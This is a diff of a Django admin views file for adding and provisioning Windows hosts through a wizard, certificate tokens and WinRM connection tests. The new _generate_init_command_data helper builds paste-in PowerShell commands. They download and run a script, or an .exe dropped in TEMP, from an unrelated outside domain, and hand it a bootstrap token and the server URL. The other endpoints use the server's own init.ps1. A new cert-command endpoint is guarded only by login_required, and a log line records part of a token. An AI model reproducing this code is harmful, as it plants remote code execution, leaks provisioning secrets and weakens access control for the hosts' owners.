@@ -8,7 +8,9 @@
 import json
 import logging
 import os
+import platform
 import secrets
+from datetime import timedelta
 
 from django.conf import settings
 from django.contrib import messages
@@ -18,12 +20,15 @@ from django.core.paginator import Paginator
 from django.db.models import Q
 from django.http import JsonResponse
 from django.shortcuts import get_object_or_404, redirect, render
+from django.utils import timezone
 from django.utils.decorators import method_decorator
 from django.views import View
 from django.views.generic import DetailView, TemplateView
 
+from django.contrib.auth.decorators import login_required
+
 from apps.accounts.provider_decorators import admin_required
-from utils.provider import get_provider_hosts
+from utils.provider import get_provider_hosts, PROVIDER_GROUP_NAME
 
 from .forms_admin import AdminHostForm, AdminHostGroupForm
 from .forms_wizard import HostWizardForm, CONNECTION_DEFAULT_PORTS, CONNECTION_DEFAULT_SSL
@@ -33,9 +38,72 @@ User = get_user_model()
 logger = logging.getLogger(__name__)
 
 
+def _is_local_winserver():
+    return platform.system() == 'Windows' and 'server' in platform.version().lower()
+
+
+def _generate_init_command_data(request, host):
+    from apps.bootstrap.models import InitialToken
+    import base64
+
+    token = secrets.token_urlsafe(32)
+    expires_at = timezone.now() + timedelta(hours=24)
+
+    initial_token = InitialToken.objects.create(
+        token=token,
+        host=host,
+        expires_at=expires_at,
+        status='ISSUED',
+    )
+
+    pairing_code = initial_token.generate_pairing_code()
+
+    config_data = {
+        'c_side_url': request.build_absolute_uri(
+            '/'
+        ).rstrip('/'),
+        'token': initial_token.token,
+        'host_id': str(host.id),
+        'expires_at': initial_token.expires_at.isoformat(),
+    }
+    config_json = json.dumps(config_data)
+    encoded_config = base64.b64encode(
+        config_json.encode('utf-8')
+    ).decode('utf-8')
+
+    one_liner = (
+        "& ([ScriptBlock]::Create("
+        "(irm https://static.2c2a.cc.cd/hostinitbash.ps1)"
+        f")) -Secret '{encoded_config}'"
+    )
+
+    fallback_command = (
+        "$e = \"$env:TEMP\\h_side_init.exe\"; "
+        "irm https://2c2a.cc.cd/hostinitbash.exe "
+        f"-OutFile $e; & $e '{encoded_config}'"
+    )
+
+    return {
+        'pairing_code': pairing_code,
+        'one_liner': one_liner,
+        'fallback_command': fallback_command,
+        'expires_at': initial_token.expires_at.isoformat(),
+        'host_id': host.id,
+        'hostname': host.hostname,
+    }
+
+
+def _get_host_form_context():
+    return {
+        'default_ports': json.dumps(CONNECTION_DEFAULT_PORTS),
+        'default_ssl': json.dumps(CONNECTION_DEFAULT_SSL),
+        'is_local_winserver': json.dumps(_is_local_winserver()),
+    }
+
+
 def _get_permission_context(form, host=None):
     provider_users = User.objects.filter(
-        groups__name='提供商',
+        groups__name=PROVIDER_GROUP_NAME,
         is_staff=True,
         is_superuser=False,
     ).order_by('username')
@@ -52,7 +120,7 @@ def _get_permission_context(form, host=None):
             'name': g.name,
             'member_ids': list(
                 g.user_set.filter(
-                    groups__name='提供商',
+                    groups__name=PROVIDER_GROUP_NAME,
                     is_staff=True,
                     is_superuser=False,
                 )
@@ -208,7 +276,6 @@ class AdminHostDetailView(DetailView):
             generated_password = self.request.session.get(
                 'generated_password'
             )
-            # 一次性读取后清除
             self.request.session.pop('generated_password', None)
             self.request.session.pop(
                 'generated_password_host_id', None
@@ -245,15 +312,71 @@ class AdminHostCreateView(TemplateView):
             'is_create': True,
         })
         context.update(_get_permission_context(form))
+        context.update(_get_host_form_context())
         return context
 
     def post(self, request, *args, **kwargs):
-        form = AdminHostForm(request.POST)
+        form = AdminHostForm(
+            request.POST, request.FILES
+        )
         if form.is_valid():
-            host = form.save(commit=False)
-            host.created_by = request.user
-            host.save()
-            form.save_m2m()
+            init_token_value = form.cleaned_data.get('init_token', '')
+            logger.info(f"Wizard save: init_token={'yes' if init_token_value else 'no'}, value={init_token_value[:8] if init_token_value else 'N/A'}")
+            existing_host = None
+            cert_token_obj = None
+            if init_token_value:
+                from apps.bootstrap.models import CertProvisionToken
+                try:
+                    cert_token_obj = CertProvisionToken.objects.get(token=init_token_value)
+                    if cert_token_obj.host:
+                        existing_host = cert_token_obj.host
+                except CertProvisionToken.DoesNotExist:
+                    pass
+
+            if existing_host:
+                for field in ['name', 'os_type', 'hostname', 'connection_type',
+                              'auth_method', 'port', 'rdp_port', 'use_ssl',
+                              'username', 'description']:
+                    if field in form.cleaned_data:
+                        setattr(existing_host, field, form.cleaned_data[field])
+                pwd = form.cleaned_data.get('password', '')
+                if pwd:
+                    existing_host.password = pwd
+                existing_host.save()
+                form.instance = existing_host
+                form.save_m2m()
+                # 保存证书文件
+                if existing_host.auth_method == 'certificate':
+                    form._save_cert_files(existing_host)
+                host = existing_host
+            else:
+                host = form.save(commit=False)
+                host.created_by = request.user
+                host.save()
+                form.save_m2m()
+                # 保存证书文件
+                if host.auth_method == 'certificate':
+                    form._save_cert_files(host)
+
+            if cert_token_obj and not existing_host:
+                cert_token_obj.host = host
+                if cert_token_obj.cert_data:
+                    cd = cert_token_obj.cert_data
+                    host.cert_root = cd.get('cert_root', '')
+                    host.cert_sub = cd.get('cert_sub', '')
+                    host.pfx_password = cd.get('pfx_password', '')
+                    host.ntlm_fallback_user = cd.get('ntlm_user', '')
+                    host.ntlm_fallback_password = cd.get('ntlm_password', '')
+                    host.cert_provision_status = 'ready'
+                    # 根据 cert_root 和 cert_sub 计算证书路径
+                    if host.cert_root and host.cert_sub:
+                        from utils.cert_storage import get_cert_dir
+                        cert_dir = get_cert_dir(host.cert_root, host.cert_sub)
+                        host.cert_pem_path = str(cert_dir / 'client.crt')
+                        host.cert_key_path = str(cert_dir / 'client.key')
+                    host.save()
+                    cert_token_obj.cert_data = None
+                cert_token_obj.save()
 
             # 测试连接
             try:
@@ -281,13 +404,24 @@ class AdminHostCreateView(TemplateView):
                     f'已为主机 {host.name} 自动生成密码，'
                     f'请妥善保存。'
                 )
-                # 将生成的密码存入 session 以便在详情页展示
                 request.session['generated_password'] = (
                     form.generated_password
                 )
                 request.session['generated_password_host_id'] = (
                     host.pk
                 )
+
+            init_token = request.POST.get('init_token')
+            if (host.auth_method == 'certificate'
+                    and init_token and not cert_token_obj):
+                try:
+                    from apps.bootstrap.models import CertProvisionToken
+                    CertProvisionToken.objects.filter(
+                        token=init_token,
+                        host__isnull=True,
+                    ).update(host=host)
+                except Exception:
+                    pass
 
             return redirect('admin:admin_hosts:host_detail', pk=host.pk)
 
@@ -329,11 +463,14 @@ class AdminHostUpdateView(TemplateView):
             'is_create': False,
         })
         context.update(_get_permission_context(form, host))
+        context.update(_get_host_form_context())
         return context
 
     def post(self, request, *args, **kwargs):
         host = self.get_host()
-        form = AdminHostForm(request.POST, instance=host)
+        form = AdminHostForm(
+            request.POST, request.FILES, instance=host
+        )
         if form.is_valid():
             host = form.save()
 
@@ -689,24 +826,65 @@ def admin_host_wizard(request):
     最终一次性提交表单创建主机。
     """
     if request.method == 'POST':
-        form = HostWizardForm(request.POST)
+        form = HostWizardForm(
+            request.POST, request.FILES
+        )
         if form.is_valid():
             host = form.save(commit=False)
             host.created_by = request.user
             host.save()
             form.save_m2m()
+            # 保存证书文件
+            if host.auth_method == 'certificate':
+                form._save_cert_files(host)
 
-            # 测试连接
+            init_token_value = form.cleaned_data.get('init_token', '')
+            if init_token_value:
+                from apps.bootstrap.models import CertProvisionToken
+                try:
+                    cert_token_obj = CertProvisionToken.objects.get(token=init_token_value)
+                    if not cert_token_obj.host_id:
+                        cert_token_obj.host = host
+                        if cert_token_obj.cert_data:
+                            cd = cert_token_obj.cert_data
+                            host.cert_root = cd.get('cert_root', '')
+                            host.cert_sub = cd.get('cert_sub', '')
+                            host.pfx_password = cd.get('pfx_password', '')
+                            host.ntlm_fallback_user = cd.get('ntlm_user', '')
+                            host.ntlm_fallback_password = cd.get('ntlm_password', '')
+                            host.cert_provision_status = 'ready'
+                            # 根据 cert_root 和 cert_sub 计算证书路径
+                            if host.cert_root and host.cert_sub:
+                                from utils.cert_storage import get_cert_dir
+                                cert_dir = get_cert_dir(host.cert_root, host.cert_sub)
+                                host.cert_pem_path = str(cert_dir / 'client.crt')
+                                host.cert_key_path = str(cert_dir / 'client.key')
+                            host.save()
+                            cert_token_obj.cert_data = None
+                        cert_token_obj.save()
+                        host.refresh_from_db()
+                except CertProvisionToken.DoesNotExist:
+                    pass
+
             try:
-                host.test_connection()
-                status_display = dict(Host.STATUS_CHOICES).get(
-                    host.status, host.status
-                )
-                messages.success(
-                    request,
-                    f'主机 {host.name} 创建成功，'
-                    f'状态: {status_display}'
-                )
+                if host.auth_method == 'certificate':
+                    from apps.hosts.tasks import test_winrm_connection
+                    test_winrm_connection.delay(host.pk, use_certificate_auth=True)
+                    messages.success(
+                        request,
+                        f'主机 {host.name} 创建成功，'
+                        f'证书连接测试正在后台执行'
+                    )
+                else:
+                    host.test_connection()
+                    status_display = dict(Host.STATUS_CHOICES).get(
+                        host.status, host.status
+                    )
+                    messages.success(
+                        request,
+                        f'主机 {host.name} 创建成功，'
+                        f'状态: {status_display}'
+                    )
             except Exception as e:
                 messages.warning(
                     request,
@@ -749,9 +927,15 @@ def admin_host_wizard(request):
     context = {
         'form': form,
         'providers_with_count': providers_with_count,
-        'connection_type_choices': Host.CONNECTION_TYPE_CHOICES,
+        'connection_type_choices': [
+            c for c in Host.CONNECTION_TYPE_CHOICES
+            if c[0] in ('winrm', 'localwinserver')
+        ],
+        'os_type_choices': Host.OS_TYPE_CHOICES,
+        'auth_method_choices': Host.AUTH_METHOD_CHOICES,
         'default_ports': json.dumps(CONNECTION_DEFAULT_PORTS),
         'default_ssl': json.dumps(CONNECTION_DEFAULT_SSL),
+        'is_local_winserver': json.dumps(_is_local_winserver()),
         'gateway_url': gateway_url,
         'server_base_url': server_base_url,
         'page_title': '添加主机',
@@ -763,6 +947,60 @@ def admin_host_wizard(request):
         'admin_base/hosts/host_wizard.html',
         context,
     )
+
+
+@admin_required
+def admin_host_wizard_generate_init_command(request):
+    if request.method != 'POST':
+        return JsonResponse(
+            {'success': False, 'error': 'Method not allowed'},
+            status=405,
+        )
+
+    import base64, json
+    from apps.bootstrap.models import CertProvisionToken
+    from apps.bootstrap.token_utils import encode_provision_token
+
+    token_str = secrets.token_hex(32)
+    server_host = request.get_host()
+    scheme = 'https' if request.is_secure() else 'http'
+
+    ip_address = ''
+    try:
+        body = json.loads(request.body)
+        ip_address = body.get('ip_address', '')
+    except (json.JSONDecodeError, ValueError):
+        ip_address = request.POST.get('ip_address', '')
+
+    CertProvisionToken.objects.create(
+        token=token_str,
+        host=None,
+        server_host=server_host,
+        ip_address=ip_address,
+        expires_at=timezone.now() + timedelta(minutes=60),
+        status='ISSUED',
+        created_by=request.user,
+    )
+
+    encoded = encode_provision_token(token_str, scheme, server_host)
+    script_url = f"{scheme}://{server_host}/static/scripts/init.ps1"
+    one_liner = (
+        f"$script = [Text.Encoding]::UTF8.GetString((iwr '{script_url}' -UseBasicParsing).RawContentStream.ToArray()); "
+        f"& ([ScriptBlock]::Create($script)) {encoded}"
+    )
+    fallback_command = (
+        f"$script = [Text.Encoding]::UTF8.GetString((iwr '{script_url}' -UseBasicParsing).RawContentStream.ToArray()); "
+        f"& ([ScriptBlock]::Create($script)) {encoded} debug"
+    )
+
+    return JsonResponse({
+        'success': True,
+        'data': {
+            'token': token_str,
+            'one_liner': one_liner,
+            'fallback_command': fallback_command,
+        },
+    })
 
 
 @admin_required
@@ -793,3 +1031,150 @@ def admin_host_wizard_generate_token(request):
             'success': False,
             'error': 'Failed to generate tunnel token',
         }, status=500)
+
+
+@admin_required
+def admin_host_wizard_test_connection(request):
+    if request.method != 'POST':
+        return JsonResponse({'success': False, 'error': 'Method not allowed'}, status=405)
+
+    try:
+        data = json.loads(request.body)
+    except (json.JSONDecodeError, ValueError):
+        return JsonResponse({'success': False, 'error': '请求数据格式无效'}, status=400)
+
+    connection_type = data.get('connection_type', 'winrm')
+    hostname = data.get('hostname', '').strip()
+    port = data.get('port', 5985)
+    use_ssl = data.get('use_ssl', False)
+    auth_method = data.get('auth_method', 'ntlm')
+    username = data.get('username', '').strip()
+    password = data.get('password', '')
+
+    if not hostname:
+        return JsonResponse({'success': False, 'error': '主机地址不能为空'}, status=400)
+
+    if auth_method == 'ntlm':
+        if not username:
+            return JsonResponse({'success': False, 'error': '用户名不能为空'}, status=400)
+        if not password:
+            return JsonResponse({'success': False, 'error': '密码不能为空'}, status=400)
+
+    try:
+        if connection_type == 'localwinserver':
+            from utils.local_winserver_client import LocalWinServerClient
+            client = LocalWinServerClient(
+                username=username,
+                password=password,
+            )
+            result = client.execute_command('echo Connection Test OK')
+        elif connection_type == 'winrm' and auth_method == 'ntlm':
+            from utils.winrm_client import WinrmClient
+            client = WinrmClient(
+                hostname=hostname,
+                port=int(port),
+                username=username,
+                password=password,
+                use_ssl=bool(use_ssl),
+                auth_method='ntlm',
+            )
+            result = client.execute_command('whoami')
+        elif connection_type == 'winrm' and auth_method == 'certificate':
+            return JsonResponse({
+                'success': False,
+                'error': '证书认证方式请先保存主机后再测试连接',
+            })
+        else:
+            return JsonResponse({
+                'success': False,
+                'error': f'不支持的连接类型: {connection_type}',
+            })
+
+        if result.success:
+            output = result.std_out.strip() if result.std_out else ''
+            return JsonResponse({
+                'success': True,
+                'message': f'连接成功{f" ({output})" if output else ""}',
+            })
+        else:
+            error_detail = result.std_err.strip() if result.std_err else f'命令执行返回非零状态码: {result.status_code}'
+            return JsonResponse({
+                'success': False,
+                'error': f'连接失败: {error_detail}',
+            })
+
+    except Exception as e:
+        error_message = str(e)
+        logger.error(f"向导即时连接测试失败: {hostname}, 错误: {error_message}")
+        return JsonResponse({
+            'success': False,
+            'error': f'连接测试失败: {error_message}',
+        })
+
+
+@admin_required
+def admin_host_generate_init_command(request, pk):
+    host = get_object_or_404(Host, pk=pk)
+
+    if request.method != 'POST':
+        return JsonResponse(
+            {'success': False, 'error': 'Method not allowed'},
+            status=405,
+        )
+
+    try:
+        init_data = _generate_init_command_data(request, host)
+        return JsonResponse({'success': True, 'data': init_data})
+    except Exception as e:
+        return JsonResponse(
+            {'success': False, 'error': str(e)},
+            status=500,
+        )
+
+
+@login_required
+def admin_host_generate_cert_command(request):
+    if request.method != 'POST':
+        return JsonResponse({'success': False, 'error': 'Method not allowed'}, status=405)
+
+    host_id = request.POST.get('host_id')
+    host = get_object_or_404(Host, pk=host_id)
+
+    if host.auth_method != 'certificate':
+        return JsonResponse({'success': False, 'error': 'Host is not configured for certificate auth'}, status=400)
+
+    from apps.bootstrap.models import CertProvisionToken
+    from apps.bootstrap.token_utils import encode_provision_token
+
+    token_str = secrets.token_hex(32)
+    server_host = request.get_host()
+    scheme = 'https' if request.is_secure() else 'http'
+
+    provision_token = CertProvisionToken.objects.create(
+        token=token_str,
+        host=host,
+        server_host=server_host,
+        ip_address=host.hostname or '',
+        expires_at=timezone.now() + timedelta(minutes=60),
+        status='ISSUED',
+        created_by=request.user,
+    )
+
+    encoded = encode_provision_token(token_str, scheme, server_host)
+    script_url = f"{scheme}://{server_host}/static/scripts/init.ps1"
+    command = (
+        f"$script = [Text.Encoding]::UTF8.GetString((iwr '{script_url}' -UseBasicParsing).RawContentStream.ToArray()); "
+        f"& ([ScriptBlock]::Create($script)) {encoded}"
+    )
+    debug_command = (
+        f"$script = [Text.Encoding]::UTF8.GetString((iwr '{script_url}' -UseBasicParsing).RawContentStream.ToArray()); "
+        f"& ([ScriptBlock]::Create($script)) {encoded} debug"
+    )
+
+    return JsonResponse({
+        'success': True,
+        'command': command,
+        'debug_command': debug_command,
+        'token': token_str,
+        'expires_at': provision_token.expires_at.isoformat(),
+    })
